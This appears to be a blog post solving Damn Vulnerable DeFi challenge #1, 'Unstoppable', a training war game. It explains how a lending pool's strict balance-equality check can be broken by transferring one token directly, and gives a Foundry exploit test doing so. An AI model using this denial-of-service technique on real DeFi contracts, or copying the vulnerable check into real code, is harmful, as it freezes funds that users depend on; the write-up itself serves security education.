---
title: 'Damn Vulnerable DeFi Challenge #1 Solution — Unstoppable'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>Our end goal in this challenge is to DOS (Denial of Service) the contract, preventing anyone to interact with it.
'
coverImage: 
  url: '/assets/blog/ethereum.jpg'
  credit: 
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2020-04-02T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

[Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.

Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #1  —  Unstoppable

> There’s a lending pool with a million DVT tokens in balance, offering flash loans for free.  
> If only there was a way to attack and stop the pool from offering flash loans …You start with 100 DVT tokens in balance.

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/unstoppable)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/unstoppable/unstoppable.challenge.js)

## The attacker end goal

Our end goal in this challenge is to DOS (Denial of Service) the contract, preventing anyone to interact with it.

How can we break things?

## Study the contracts

#### `UnstoppableLender`

Let’s see what’s inside the Lending platform `UnstoppableLender`

We can see that

- The contract is using Solidity `>0.8`. This mean that this contract will not be prone to underflow/overflow errors.
- The contract inherit from the OpenZeppelin’s ReentrancyGuard contract, so we can be sure that reentrancy will not be a problem.
- We assume that the DVT (Damn Vulnerable Token) token is a safe contract
- The `constructor` is correctly checking that the DVT token is not an empty address

Let’s see what’s inside the `flashLoan` function

- It checks that `borrowAmount` is not 0
- It correctly checks that the balance of the Lending Pool has enough tokens to sustain the flashloan to the user
- It’s checking that `poolBalance` (state variable that track token deposited on the pool by users) is equal to the actual token balance of the pool `damnValuableToken.balanceOf(address(_this_))`
- It will perform the flash loan
- It will check that the balance after the flashloan is greater than the balance before. This is needed becasue we want to be sure that the user has at least repaid their loan debt.   
  `uint256 balanceAfter = damnValuableToken.balanceOf(address(_this_)); require(balanceAfter >= balanceBefore, “Flash loan hasn’t been paid back”);`

The first thing that come to my mind is the [SWC-132: Unexpected Ether balance](https://swcregistry.io/docs/SWC-132) that says:

> Contracts can behave erroneously when they strictly assume a specific Ether balance. It is always possible to forcibly send ether to a contract (without triggering its fallback function), using selfdestruct, or by mining to the account. In the worst case scenario this could lead to DOS conditions that might render the contract unusable.

The same thing applies here. The Lending Pool is assuming that all the users will supply tokens to the pool via the `depositTokens` method that will update the `poolBalance` internal balance.

So, how can we break the assumption that `assert(poolBalance == balanceBefore);`?

It’s pretty simple: we just make our attacker that has 100 DVT tokens to send 1 token to the Lending Pool address directly

`token.transfer(address(pool), 1);`

Thereafter, you would have that `poolBalance` would still be 1M tokens but the real balance of the lending pool would be 1M+1

## Solution code

You can see the full solution in the repository of [Damn Vulnerable DeFi — Foundry edition](https://github.com/StErMi/forge-damn-vulnerable-defi)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {stdError} from "forge-std/stdlib.sol";

import "../../unstoppable/UnstoppableLender.sol";
import "../../unstoppable/ReceiverUnstoppable.sol";

import "../../DamnValuableToken.sol";

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

contract UnstoppableLenderTest is BaseTest {

    uint TOKENS_IN_POOL = 1000000 ether;
    uint INITIAL_ATTACKER_TOKEN_BALANCE = 100 ether;

    DamnValuableToken token;
    UnstoppableLender pool;
    ReceiverUnstoppable receiverContract;

    address payable attacker;
    address payable someUser;

    constructor() {
        string[] memory labels = new string[](2);
        labels[0] = "Attacker";
        labels[1] = "Some User";

        preSetup(2, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];
        someUser = users[1];

        // setup contracts
        token = new DamnValuableToken();
        pool = new UnstoppableLender(address(token));

        // setup tokens
        token.approve(address(pool), TOKENS_IN_POOL);
        pool.depositTokens(TOKENS_IN_POOL);

        token.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        vm.startPrank(someUser);
        receiverContract = new ReceiverUnstoppable(address(pool));
        receiverContract.executeFlashLoan(10);
        vm.stopPrank();
    }


    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.prank(attacker);
        token.transfer(address(pool), 1);
    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        vm.expectRevert(stdError.assertionError);
        vm.prank(someUser);
        receiverContract.executeFlashLoan(10);
    }
}
```

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION.
